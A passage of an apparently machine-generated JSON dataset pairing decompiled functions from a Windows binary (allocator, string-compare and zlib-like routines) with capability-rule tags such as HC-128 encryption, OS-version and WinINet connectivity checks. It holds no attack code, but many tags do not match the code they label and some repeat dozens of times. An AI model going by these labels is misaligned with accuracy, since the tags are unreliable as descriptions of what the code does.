*puVar3 = *puVar3 & 0xf7;\n        }\n        else {\n            uVar18 = *(puVar16 + 0x1a);\n            iVar13 = uVar17 - uVar18;\n            *(ppuVar10 + (uVar18 - 4)) = iVar13 + 3;\n            *(ppuVar10 + iVar13 + -8 + uVar18) = iVar13;\n            fcn.0040162c();\n            uVar17 = uVar18;\n        }\n    }\n    ppuVar10[-1] = uVar17 + 6;\n    *0x495718 = 0;\n    *ppuVar10 = puVar16;\n    ppuVar10[2] = NULL;\n    ppuVar10[3] = 0x1;\n    *(puVar16 + 0x10) = ppuVar10;\n    *(puVar16 + 8) = *(puVar16 + 2) + ppuVar10 + 8;\n    *(puVar16 + 0xc) = ppuVar10 + (uVar17 - *(puVar16 + 2));\n    *puVar16 = 0;\n    ppuVar10[7] = ppuVar10;\n    return ppuVar10 + 8;\n}\n",
        "token_count": 3303
    },
    "00402c98": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.00402c98(void)\n\n{\n    uint32_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    iVar3 = 0;\n    puVar2 = 0x49104e;\n    uVar1 = 0;\n    do {\n        if ((*0x495706 == '\\0') || (uVar4 = uVar1,  (*puVar2 & 0xf) == 0)) {\n            uVar4 = *puVar2 >> 3;\n            for (; uVar1 < uVar4; uVar1 = uVar1 + 1) {\n                *(uVar1 + 0x4955c0) = iVar3 * '\\x04';\n            }\n        }\n        iVar3 = iVar3 + 1;\n        puVar2 = puVar2 + 0x10;\n        uVar1 = uVar4;\n    } while (iVar3 != 0x37);\n    return;\n}\n",
        "token_count": 222
    },
    "00405974": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.00405974(uint param_1, char *param_2)\n\n{\n    uint32_t uVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    \n    if (in_EAX != param_2) {\n        if ((in_EAX & param_2) == 0) {\n            if (in_EAX == NULL) {\n                return NULL;\n            }\n            if (param_2 == NULL) {\n                return in_EAX;\n            }\n        }\n        if (*in_EAX - *param_2 == 0) {\n            uVar5 = *(in_EAX + -4) - *(param_2 + -4);\n            iVar3 = (((*in_EAX - *param_2) - 1) + (*(in_EAX + -4) < *(param_2 + -4)) & uVar5) - *(in_EAX + -4);\n            uVar2 = in_EAX - iVar3;\n            iVar4 = iVar3;\n            while (uVar6 = *(iVar4 + uVar2) ^ *(param_2 + (iVar4 - iVar3)),  uVar6 == 0) {\n                iVar4 = iVar4 + 4;\n                if (-1 < iVar4) goto code_r0x004059a4;\n            }\n            uVar1 = 0;\n            if (uVar6 != 0) {\n                for (; (uVar6 >> uVar1 & 1) == 0; uVar1 = uVar1 + 1) {\n                }\n            }\n            iVar4 = iVar4 + (uVar1 >> 3);\n            if (iVar4 < 0) {\n                return uVar2 & 0xffffff00 | *(iVar4 + uVar2);\n            }\ncode_r0x004059a4:\n            in_EAX = uVar5 * 2;\n        }\n    }\n    return in_EAX;\n}\n",
        "token_count": 448
    },
    "004098ec": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004098ec(uint param_1, uint8_t *param_2)\n\n{\n    uint32_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    if (in_EAX == param_2) {\n        return 0;\n    }\n    if ((in_EAX & param_2) == 0) {\n        if (in_EAX == NULL) {\n            return -*(param_2 + -4);\n        }\n        if (param_2 == NULL) {\n            return *(in_EAX + -4);\n        }\n    }\n    if (*param_2 != *in_EAX) {\n        return *in_EAX - *param_2;\n    }\n    uVar4 = *(in_EAX + -4) - *(param_2 + -4);\n    iVar2 = ((*(in_EAX + -4) < *(param_2 + -4)) - 1 & uVar4) - *(in_EAX + -4);\n    iVar3 = iVar2;\n    while (uVar5 = *(in_EAX + (iVar3 - iVar2)) ^ *(param_2 + (iVar3 - iVar2)),  uVar5 == 0) {\n        iVar3 = iVar3 + 4;\n        if (-1 < iVar3) {\n            return uVar4;\n        }\n    }\n    uVar1 = 0;\n    if (uVar5 != 0) {\n        for (; (uVar5 >> uVar1 & 1) == 0; uVar1 = uVar1 + 1) {\n        }\n    }\n    iVar3 = iVar3 + (uVar1 >> 3);\n    if (-1 < iVar3) {\n        return uVar4;\n    }\n    return in_EAX[iVar3 - iVar2] - param_2[iVar3 - iVar2];\n}\n",
        "token_count": 429
    },
    "004693dc": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004693dc(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint uVar8;\n    uint8_t *puVar9;\n    uint8_t **in_EAX;\n    uint8_t *puVar10;\n    uint32_t uVar11;\n    uint8_t *puVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    uint8_t *puVar16;\n    uint8_t *puVar17;\n    uint8_t *puVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint8_t *puStack72;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint uStack16;\n    \n    puVar1 = in_EAX[7];\n    puStack72 = *in_EAX + -1;\n    puVar12 = in_EAX[1] + -5 + puStack72;\n    puVar17 = in_EAX[3] + -1;\n    iVar13 = puVar17 - (param_2 - in_EAX[4]);\n    puVar10 = in_EAX[4] + -0x101 + puVar17;\n    iVar2 = puVar1[9];\n    uVar3 = puVar1[10];\n    uVar4 = puVar1[0xb];\n    iVar14 = puVar1[0xc];\n    uStack40 = puVar1[0xd];\n    uStack36 = puVar1[0xe];\n    iVar5 = puVar1[0x12];\n    iVar6 = puVar1[0x13];\n    uVar7 = puVar1[0x14];\n    uVar8 = puVar1[0x15];\ncode_r0x004694aa:\n    if (uStack36 < 0xf) {\n        puVar9 = puStack72 + 1;\n        puStack72 = puStack72 + 2;\n        uStack40 = uStack40 + (*puVar9 << (uStack36 & 0x1f)) + (*puStack72 << (uStack36 + 8 & 0x1f));\n        uStack36 = uStack36 + 0x10;\n    }\n    uStack16 = *(iVar5 + (uStack40 & (1 << (uVar7 & 0x1f)) - 1U) * 4);\n    while( true ) {\n        uStack40 = uStack40 >> (uStack16._1_1_ & 0x1f);\n        uStack36 = uStack36 - uStack16._1_1_;\n        if ((uStack16 & 0xff) == 0) break;\n        if ((uStack16 & 0x10) != 0) {\n            uVar11 = uStack16._2_2_;\n            uVar19 = uStack16 & 0xf;\n            if ((uStack16 & 0xf) != 0) {\n                if (uStack36 < uVar19) {\n                    puStack72 = puStack72 + 1;\n                    uStack40 = uStack40 + (*puStack72 << (uStack36 & 0x1f));\n                    uStack36 = uStack36 + 8;\n                }\n                uVar11 = uVar11 + ((1 << uVar19) - 1U & uStack40);\n                uStack40 = uStack40 >> uVar19;\n                uStack36 = uStack36 - uVar19;\n            }\n            if (uStack36 < 0xf) {\n                puVar9 = puStack72 + 1;\n                puStack72 = puStack72 + 2;\n                uStack40 = uStack40 + (*puVar9 << (uStack36 & 0x1f)) + (*puStack72 << (uStack36 + 8 & 0x1f));\n                uStack36 = uStack36 + 0x10;\n            }\n            uStack16 = *(iVar6 + (uStack40 & (1 << (uVar8 & 0x1f)) - 1U) * 4);\n            goto code_r0x004695be;\n        }\n        if ((uStack16 & 0x40) != 0) {\n            if ((uStack16 & 0x20) == 0) {\n                in_EAX[6] = 0x492c08;\n                *puVar1 = 0x12;\n            }\n            else {\n                *puVar1 = 3;\n            }\n            goto code_r0x00469833;\n        }\n        uStack16 = *(iVar5 + (((1 << (uStack16 & 0x1f)) - 1U & uStack40) + uStack16._2_2_) * 4);\n    }\n    puVar17[1] = uStack16._2_1_;\n    puVar17 = puVar17 + 1;\n    goto code_r0x0046981f;\ncode_r0x004695be:\n    uStack40 = uStack40 >> (uStack16._1_1_ & 0x1f);\n    uVar19 = uStack36 - uStack16._1_1_;\n    uStack36 = uVar19;\n    if ((uStack16 & 0x10) != 0) goto code_r0x004695de;\n    if ((uStack16 & 0x40) != 0) {\n        in_EAX[6] = 0x492bf2;\n        *puVar1 = 0x12;\n        goto code_r0x00469833;\n    }\n    uStack16 = *(iVar6 + (((1 << (uStack16 & 0x1f)) - 1U & uStack40) + uStack16._2_2_) * 4);\n    goto code_r0x004695be;\ncode_r0x004695de:\n    uStack16 = uStack16 & 0xf;\n    puVar9 = puStack72;\n    if (uVar19 < uStack16) {\n        uStack40 = uStack40 + (puStack72[1] << (uVar19 & 0x1f));\n        uStack36 = uVar19 + 8;\n        puVar9 = puStack72 + 1;\n        if (uStack36 < uStack16) {\n            uStack40 = uStack40 + (puStack72[2] << (uStack36 & 0x1f));\n            uStack36 = uVar19 + 0x10;\n            puVar9 = puStack72 + 2;\n        }\n    }\n    puStack72 = puVar9;\n    uVar19 = (1 << uStack16) - 1U & uStack40;\n    uStack40 = uStack40 >> uStack16;\n    uStack36 = uStack36 - uStack16;\n    uVar20 = puVar17 - iVar13;\n    uVar19 = uStack16._2_2_ + uVar19;\n    if (uVar20 < uVar19) {\n        uVar20 = uVar19 - uVar20;\n        if (uVar3 < uVar20) {\n            in_EAX[6] = 0x492bd4;\n            *puVar1 = 0x12;\ncode_r0x00469833:\n            puStack72 = puStack72 + -(uStack36 >> 3);\n            iVar2 = uStack36 - (uStack36 & 0xfffffff8);\n            *in_EAX = puStack72 + 1;\n            in_EAX[3] = puVar17 + 1;\n            if (puStack72 < puVar12) {\n                iVar14 = puVar12 - puStack72;\n            }\n            else {\n                iVar14 = -(puStack72 - puVar12);\n            }\n            in_EAX[1] = iVar14 + 5;\n            if (puVar17 < puVar10) {\n                iVar14 = puVar10 - puVar17;\n            }\n            else {\n                iVar14 = -(puVar17 - puVar10);\n            }\n            in_EAX[4] = iVar14 + 0x101;\n            puVar1[0xd] = uStack40 & (1 << (iVar2 & 0x1f)) - 1U;\n            puVar1[0xe] = iVar2;\n            return;\n        }\n        iVar15 = iVar14 + -1;\n        puVar9 = puVar17;\n        if (uVar4 == 0) {\n            puVar16 = iVar15 + (iVar2 - uVar20);\n            if (uVar20 < uVar11) {\n                uVar11 = uVar11 - uVar20;\n                do {\n                    puVar17 = puVar17 + 1;\n                    puVar16 = puVar16 + 1;\n                    *puVar17 = *puVar16;\n                    uVar20 = uVar20 - 1;\n                } while (uVar20 != 0);\n                puVar16 = puVar17 + -uVar19;\n                puVar9 = puVar17;\n            }\n        }\n        else if (uVar4 < uVar20) {\n            puVar16 = iVar15 + ((iVar2 + uVar4) - uVar20);\n            uVar20 = uVar20 - uVar4;\n            if (uVar20 < uVar11) {\n                uVar11 = uVar11 - uVar20;\n                do {\n                    puVar17 = puVar17 + 1;\n                    puVar16 = puVar16 + 1;\n                    *puVar17 = *puVar16;\n                    uVar20 = uVar20 - 1;\n                } while (uVar20 != 0);\n                puVar16 = iVar14 + -1;\n                puVar9 = puVar17;\n                if (uVar4 < uVar11) {\n                    uVar11 = uVar11 - uVar4;\n                    uVar20 = uVar4;\n                    do {\n                        puVar17 = puVar17 + 1;\n                        puVar16 = puVar16 + 1;\n                        *puVar17 = *puVar16;\n                        uVar20 = uVar20 - 1;\n                    } while (uVar20 != 0);\n                    puVar16 = puVar17 + -uVar19;\n                    puVar9 = puVar17;\n                }\n            }\n        }\n        else {\n            puVar16 = iVar15 + (uVar4 - uVar20);\n            if (uVar20 < uVar11) {\n                uVar11 = uVar11 - uVar20;\n                do {\n                    puVar17 = puVar17 + 1;\n                    puVar16 = puVar16 + 1;\n                    *puVar17 = *puVar16;\n                    uVar20 = uVar20 - 1;\n                } while (uVar20 != 0);\n                puVar16 = puVar17 + -uVar19;\n                puVar9 = puVar17;\n            }\n        }\n        for (; 2 < uVar11; uVar11 = uVar11 - 3) {\n            puVar17 = puVar16 + 2;\n            puVar9[1] = puVar16[1];\n            puVar16 = puVar16 + 3;\n            puVar9[2] = *puVar17;\n            puVar9[3] = *puVar16;\n            puVar9 = puVar9 + 3;\n        }\n        puVar17 = puVar9;\n        if (uVar11 != 0) {\n            puVar17 = puVar9 + 1;\n            *puVar17 = puVar16[1];\n            if (1 < uVar11) {\n                puVar17 = puVar9 + 2;\n                *puVar17 = puVar16[2];\n            }\n        }\n    }\n    else {\n        puVar9 = puVar17 + -uVar19;\n        do {\n            puVar18 = puVar17;\n            puVar16 = puVar9;\n            puVar18[1] = puVar16[1];\n            puVar18[2] = puVar16[2];\n            puVar17 = puVar18 + 3;\n            uVar11 = uVar11 - 3;\n            *puVar17 = puVar16[3];\n            puVar9 = puVar16 + 3;\n        } while (2 < uVar11);\n        if (uVar11 != 0) {\n            puVar17 = puVar18 + 4;\n            *puVar17 = puVar16[4];\n            if (1 < uVar11) {\n                puVar17 = puVar18 + 5;\n                *puVar17 = puVar16[5];\n            }\n        }\n    }\ncode_r0x0046981f:\n    if ((puVar12 <= puStack72) || (puVar10 <= puVar17)) goto code_r0x00469833;\n    goto code_r0x004694aa;\n}\n",
        "token_count": 2894
    },
    "0046c6f8": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046c6f8(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar3;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    if (in_EAX[0x20] < 1) {\n        uVar2 = in_ECX + 5;\n        uVar3 = uVar2;\n    }\n    else {\n        if ((in_ECX != 0) && (*(*in_EAX + 0x2c) == 2)) {\n            fcn.0046ce90();\n        }\n        fcn.0046b670();\n        fcn.0046b670();\n        var_8h = fcn.0046c014();\n        uVar2 = in_EAX[0x5a9] + 10U >> 3;\n        uVar3 = in_EAX[0x5aa] + 10U >> 3;\n        if (uVar3 <= uVar2) {\n            uVar2 = uVar3;\n        }\n    }\n    if ((uVar2 < in_ECX + 4U) || (in_EDX == 0)) {\n        if ((in_EAX[0x21] == 4) || (uVar2 == uVar3)) {\n            if (in_EAX[0x5ae] < 0xe) {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 2 << (in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + 3;\n            }\n            else {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 2U << (in_EAX[0x5ae] & 0x1f);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad) >> 8;\n                *(in_EAX + 0x5ad) = (arg_8h + 2U & 0xffff) >> (0x10U - in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + -0xd;\n            }\n            fcn.0046c9d0();\n        }\n        else {\n            if (in_EAX[0x5ae] < 0xe) {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 4 << (in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + 3;\n            }\n            else {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 4U << (in_EAX[0x5ae] & 0x1f);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad) >> 8;\n                *(in_EAX + 0x5ad) = (arg_8h + 4U & 0xffff) >> (0x10U - in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + -0xd;\n            }\n            fcn.0046c078(var_8h + 1);\n            fcn.0046c9d0();\n        }\n    }\n    else {\n        fcn.0046c370(arg_8h);\n    }\n    fcn.0046b2a0();\n    if (arg_8h != 0) {\n        fcn.0046cf6c();\n    }\n    return;\n}\n",
        "token_count": 1100
    },
    "00401770": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401770(void)\n\n{\n    char cVar1;\n    \n    if (*0x49504d != '\\0') {\n        while (cVar1 = fcn.00401460(),  cVar1 != '\\0') {\n            if (*0x4955b5 == '\\0') {\n                sub.kernel32.dll_Sleep(0);\n                cVar1 = fcn.00401460();\n                if (cVar1 == '\\0') {\n                    return;\n                }\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "004022f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004022f4(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    if (((*0x495720 != 0) && (in_EAX <= *0x49571c)) && (*0x49571c <= in_EAX + 0x13fff0)) {\n        uVar1 = *0x49571c;\n        if (*0x495720 == 0x13ffe0) {\n            uVar1 = 0;\n        }\n        return uVar1;\n    }\n    return in_EAX + 0x10;\n}\n",
        "token_count": 134
    },
    "004025c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.004025c8(void)\n\n{\n    uint32_t in_EAX;\n    \n    if (*0x49504d != '\\0') {\n        while (in_EAX = fcn.00401460(),  in_EAX != '\\0') {\n            if (*0x4955b5 == '\\0') {\n                sub.kernel32.dll_Sleep();\n                in_EAX = fcn.00401460();\n                if (in_EAX == '\\0') break;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    if (*0x4977bc == 0) {\n        in_EAX = sub.kernel32.dll_VirtualAlloc(0, 0x10000, 0x1000, 4);\n        *0x4977bc = in_EAX;\n    }\n    return in_EAX & 0xffffff00 | *0x4977bc != 0;\n}\n",
        "token_count": 198
    },
    "0040267c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040267c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    if (*0x4977bc != NULL) {\n        cVar1 = fcn.004025c8();\n        if (cVar1 != '\\0') {\n            iVar3 = **0x4977bc;\n            if (-1 < iVar3 + -1) {\n                iVar2 = 0;\n                do {\n                    if (in_EAX == (*0x4977bc)[iVar2 + 1]) {\n                        (*0x4977bc)[iVar2 + 1] = (*0x4977bc)[**0x4977bc];\n                        **0x4977bc = **0x4977bc + -1;\n                        uVar4 = 1;\n                        break;\n                    }\n                    iVar2 = iVar2 + 1;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            *0x4977c0 = 0;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 260
    },
    "00402cdc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402cdc(void)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    code **ppcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    iVar4 = 0x37;\n    ppcVar3 = 0x491068;\n    do {\n        if (*ppcVar3 == NULL) {\n            *ppcVar3 = fcn.004015a0;\n        }\n        ppcVar3[-2] = ppcVar3 + -7;\n        ppcVar3[-6] = ppcVar3 + -7;\n        ppcVar3[-4] = NULL;\n        ppcVar3[-5] = 0x1;\n        uVar2 = (*(ppcVar3 + -0x1a) * 0xc + 0xef & 0xffffff00) + 0x30;\n        if (uVar2 < 0xb30) {\n            uVar2 = 0xb30;\n        }\n        uVar2 = uVar2 + 0x4d0 >> 0xd;\n        if (7 < uVar2) {\n            uVar2 = 7;\n        }\n        *(ppcVar3 + -0x1b) = -1 << (uVar2 & 0x1f);\n        *(ppcVar3 + -1) = (uVar2 << 0xd) + 0xb30;\n        uVar1 = *(ppcVar3 + -0x1a);\n        uVar2 = (uVar1 * 0x30 + 0xef & 0xffffff00) + 0x30;\n        if (uVar2 < 0x7330) {\n            uVar2 = 0x7330;\n        }\n        if (0xff30 < uVar2) {\n            uVar2 = 0xff30;\n        }\n        *(ppcVar3 + -2) = (((uVar2 - 0x20) / uVar1) * uVar1 + 0xef & 0xff00) + 0x30;\n        ppcVar3 = ppcVar3 + 8;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    fcn.00402c98();\n    *0x495708 = 0x495708;\n    *0x49570c = 0x495708;\n    iVar5 = 0x400;\n    iVar4 = 0x4957a8;\n    do {\n        *iVar4 = iVar4;\n        *(iVar4 + 4) = iVar4;\n        iVar4 = iVar4 + 8;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    *0x4977ac = 0x4977ac;\n    *0x4977b0 = 0x4977ac;\n    return;\n}\n",
        "token_count": 640
    },
    "00402e94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402e94(void)\n\n{\n    if (*0x4977c4 != 0) {\n        sub.user32.dll_DestroyWindow(*0x4977c4);\n        *0x4977c4 = 0;\n    }\n    if (*0x4955b4 != '\\0') {\n        fcn.00402820();\n    }\n    if (*0x4977bc != 0) {\n        sub.kernel32.dll_VirtualFree(*0x4977bc, 0, 0x8000);\n        *0x4977bc = 0;\n    }\n    fcn.00402e04();\n    return;\n}\n",
        "token_count": 142
    },
    "00403050": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00403050(void)\n\n{\n    uint8_t in_AL;\n    \n    if (*0x495008 != NULL) {\n        (**0x495008)();\n    }\n    if ((in_AL & 0x7f) == 0) {\n        fcn.00407688();\n    }\n    fcn.00402ff8();\n    return;\n}\n",
        "token_count": 79
    },
    "00402f84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
